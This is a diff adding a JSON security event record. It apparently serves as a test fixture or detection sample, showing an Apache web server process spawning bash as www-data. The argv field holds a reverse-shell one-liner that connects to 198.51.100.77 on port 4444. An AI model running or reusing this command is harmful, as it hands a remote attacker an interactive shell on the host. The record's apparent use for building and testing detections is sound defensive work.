@@ -1,0 +1,43 @@
+{
+  "event_type": "process.exec",
+  "event_time": "2026-10-18T10:27:08Z",
+  "outcome": "",
+  "entities": [
+    {
+      "role": "parent_process",
+      "type": "process_image",
+      "value": "/usr/sbin/apache2",
+      "id": "a11627e6b3b00548"
+    },
+    {
+      "role": "process",
+      "type": "process_image",
+      "value": "/bin/bash",
+      "id": "8384d7255121e423"
+    },
+    {
+      "role": "user",
+      "type": "user",
+      "value": "www-data",
+      "id": "1547777f573d86aa"
+    }
+  ],
+  "fields": [
+    {
+      "key": "argv",
+      "value": [
+        "bash",
+        "-c",
+        "bash -i \u003e\u0026 /dev/tcp/198.51.100.77/4444 0\u003e\u00261"
+      ]
+    },
+    {
+      "key": "pid",
+      "value": 4321
+    },
+    {
+      "key": "ppid",
+      "value": 4100
+    }
+  ]
+}
